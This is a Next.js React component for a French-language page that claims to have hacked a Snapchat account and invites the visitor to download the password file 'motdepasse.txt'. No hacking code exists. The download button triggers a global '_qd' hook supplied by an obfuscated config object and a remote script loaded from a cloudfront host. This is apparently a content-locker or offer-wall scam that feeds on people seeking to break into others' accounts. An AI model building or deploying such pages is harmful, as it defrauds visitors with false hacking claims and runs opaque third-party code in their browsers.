"use client";
import React, { useEffect } from "react";
import { BsFileEarmarkZip } from "react-icons/bs";
import {
  IoArrowDownOutline,
  IoCheckmark,
  IoCloudDownload,
} from "react-icons/io5";
import HowToValidate from "../HowToValidate";
import Script from "next/script";

// Extend the Window interface to include our custom property
declare global {
  interface Window {
    _qd?: () => void;
  }
}

const Validation = () => {
  useEffect(() => {
    // Declare the global function
    window._qd = () => {
      console.log("_qd function called");
      // Add your desired functionality here
    };
  }, []);

  const handleButtonClick = () => {
    if (typeof window._qd === 'function') {
      window._qd();
    } else {
      console.error('_qd function not available');
    }
  };

  return (
    <div>
      <ul className="relative flex flex-row gap-x-2">
        <li className="flex items-center gap-x-2 shrink basis-0 flex-1 group">
          <div className="min-w-7 min-h-7 inline-flex justify-center items-center text-xs align-middle">
            <div className="bg-[#7bbb292b] border-[#7bbb294d] size-9 rounded-full flex justify-center items-center">
              <IoCheckmark className="text-xl text-[#7bbb29]" />
            </div>
            <span className="ms-2 block text-sm font-medium text-[#7bbb29]">
              Sélection
            </span>
          </div>
          <div className="w-full h-[2px] relative top-[2px] flex-1 bg-[#7bbb29] group-last:hidden" />
        </li>
        <li className="flex items-center gap-x-2 shrink basis-0 flex-1 group">
          <div className="min-w-7 min-h-7 inline-flex justify-center items-center text-xs align-middle">
            <div className="bg-[#7bbb292b] border-[#7bbb294d] size-9 rounded-full flex justify-center items-center">
              <IoCheckmark className="text-xl text-[#7bbb29]" />
            </div>
            <span className="ms-2 block text-sm font-medium text-[#7bbb29]">
              Traitement
            </span>
          </div>
          <div className="w-full h-[2px] relative top-[2px] flex-1 bg-[#7bbb29] group-last:hidden" />
        </li>
        <li className="flex items-center gap-x-2 shrink basis-0 flex-1 group">
          <div className="min-w-7 min-h-7 inline-flex justify-center items-center text-xs align-middle">
            <div className="bg-[#7bbb292b] border-[#7bbb294d] size-9 rounded-full flex justify-center items-center">
              <IoCheckmark className="text-xl text-[#7bbb29]" />
            </div>
            <span className="ms-2 block text-sm font-medium text-[#7bbb29]">
              Vérification
            </span>
          </div>
          <div className="w-full h-[2px] relative top-[2px] flex-1 bg-[#7bbb29] group-last:hidden" />
        </li>
      </ul>
      <div className="mt-5 bg-zinc-800 rounded-lg p-4" id="hamza">
        <div className="lg:flex gap-4 mb-7 border-b-[1px] border-zinc-700 pb-5">
          <div className="lg:w-8/12">
            <div className="pb-5">
              <h3 className="text-[#7bbb29] font-semibold text-[19px] mb-2">
                Fichier créé avec succès!
              </h3>
              <p className="text-zinc-100 font-normal text-sm mb-1">
                Nous avons créé le fichier avec les données du compte Snapchat
                piraté, appuyez maintenant sur le bouton ci-dessous pour le
                télécharger.
              </p>
            </div>
          </div>
          <div className="lg:w-4/12">
            <div className="flex justify-center items-center flex-col h-[120px] rounded-lg bg-zinc-900">
              <div className="">
                <BsFileEarmarkZip className="text-zinc-100 text-4xl mb-3" />
              </div>
              <div className="text-zinc-200 font-semibold text-[15px]">
                motdepasse.txt
              </div>
            </div>
          </div>
        </div>
        <h3 className="text-sm md:text-base text-zinc-200 font-semibold text-center mb-4 uppercase">
          Cliquez sur le bouton ci-dessous pour télécharger le mot de passe
        </h3>
        <div className="flex justify-center items-center flex-col mb-6 border-b-[1px] border-zinc-700 pb-10">
          <div className="h-8 w-8 bg-zinc-900 rounded-full flex justify-center items-center animate-bounce mb-4">
            <IoArrowDownOutline className="text-[#7bbb29]" />
          </div>
          <button
            onClick={handleButtonClick}
            className="px-5 py-3 bg-[#fffc00] rounded-md text-zinc-950 font-semibold uppercase"
          >
            <IoCloudDownload className="inline-block text-lg relative -top-[0px] mr-0.5" />{" "}
            Obtenez le mot de passe ici!
          </button>
        </div>
        <h3 className="text-sm md:text-base text-zinc-100 font-semibold text-left uppercase mb-0.5">
          Comment verifier mon piratage?
        </h3>
        <p className="mb-2 text-sm text-left font-semibold uppercase text-[#7bbb29]">
          Suivez les instructions suivants:
        </p>
        <HowToValidate />
      </div>
      <Script id="custom-script" strategy="afterInteractive">
        {`
          var PWduN_yqj_zJrhrc={"it":1082906,"key":"db4a8"};
        `}
      </Script>
      <Script
        src="https://d9cshxmf0qazr.cloudfront.net/0f07bc8.js"
        strategy="afterInteractive"
      />
    </div>
  );
};

export default Validation;